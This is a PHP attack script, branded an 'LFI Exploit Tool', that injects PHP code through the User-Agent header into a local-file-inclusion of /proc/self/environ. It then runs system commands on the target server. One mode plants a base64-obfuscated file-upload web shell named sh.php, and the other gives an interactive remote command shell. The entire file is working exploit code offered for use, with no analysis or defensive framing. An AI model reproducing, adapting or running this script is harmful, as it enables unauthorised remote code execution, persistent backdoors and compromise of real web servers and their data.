<?php
/*
!LFI_Exploit
@ HOST = localhost = Target URL
@ PORT = 80 = Target PORT
@ PATH = / = Web site path
@ PAGE = index.php?page=../../../../../../proc/self/environ%00 = Vulnerable Page
@ MODE = 1 = Exploiting Mode 
 */
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $port, $path, $page, $cmd)
{
    if (!($sock = fsockopen($host, $port)))
        die("\n[-] No response from {$host}:{$port}\n");
		
 		$packet  = "GET {$path}{$page} HTTP/1.0\r\n";
		$packet .= "Host: {$host}\r\n";
		$packet .= "User-Agent: Mozilla/5.0 UPBHR ".$cmd." UPBHR\r\n";
		$packet .= "Connection: Close\r\n\r\n";
    fputs($sock, $packet);
	$data = stream_get_contents($sock);
	if(!preg_match("#UPBHR#",$data))
	{
	die("[-] Cannot exploit the target.\n");
	}
	$resp = explode("UPBHR",$data);
    return $resp[1];
}

print "\n+---------------------------------------------------------------+";
print "\n| LFI Exploit Tool for BHR                                      |";
print "\n|                                        by The UnKn0wN         |";
print "\n| Mode 1: reverse shell connexion                               |";
print "\n| Mode 2: spawn an upload form                                  |";
print "\n+---------------------------------------------------------------+\n";

$host = $argv[1];
$port = $argv[2];
$path = $argv[3];
$page = $argv[4];
$mode = $argv[5];

print "\n[+] Hostname    :  " .http_send($host,$port, $path, $page,"<?php echo system('hostname; echo;'); ?>");
print "\n[+] ServerIP    :  " .http_send($host,$port, $path, $page,"<?php echo \$_SERVER['SERVER_ADDR']; ?>");
print "\n[+] UserID      :  " .http_send($host,$port, $path, $page,"<?php echo system('id;echo  ;'); ?>");
print "\n[+] PHP Version :  " .http_send($host,$port, $path, $page,"<?php echo phpversion(); ?>");
print "\n[+] Script PATH :  " .http_send($host,$port, $path, $page,"<?php echo \$_SERVER['SCRIPT_FILENAME']; ?>")."\n";

switch ($mode)
{
case 2:
$sh = '<?php $h=fopen(\'sh.php\', \'w\');fwrite($h,\'<?php eval(base64_decode("aWYoaXNzZXQoJF9QT1NUWyJ1cGxvYWQiXSkpeyRjb250ZW50X2RpciA9ICIuLyI7JHRtcF9maWxlID0gJF9GSUxFU1siZmljaGllciJdWyJ0bXBfbmFtZSJdO2lmKCFpc191cGxvYWRlZF9maWxlKCR0bXBfZmlsZSkpe2V4aXQoIkxlIGZpY2hpZXIgZXN0IGludHJvdXZhYmxlIik7fSR0eXBlX2ZpbGUgPSAkX0ZJTEVTWyJmaWNoaWVyIl1bInR5cGUiXTskbmFtZV9maWxlID0gJF9GSUxFU1siZmljaGllciJdWyJuYW1lIl07aWYoIW1vdmVfdXBsb2FkZWRfZmlsZSgkdG1wX2ZpbGUsJGNvbnRlbnRfZGlyLiRuYW1lX2ZpbGUpKXtleGl0KCJJbXBvc3NpYmxlIGRlIGNvcGllciBsZSBmaWNoaWVyIGRhbnMgJGNvbnRlbnRfZGlyIik7fX0gPz48Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIyIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpY2hpZXIiIHNpemU9IjMwIj48aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJ1cGxvYWQiIHZhbHVlPSJVcGxvYWRlciI+PC9mb3JtPg==")) ?>\'); ?>';
http_send($host,$port, $path, $page,$sh);
print "[+] done. Check {$host}{$path}sh.php\n";
break;
default:
while(1)
{
    print "\nBHR@{$host}# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    print "\n\n ".http_send($host,$port, $path, $page,"<?php echo system('".$cmd."'); ?>");
}
break;
}
?>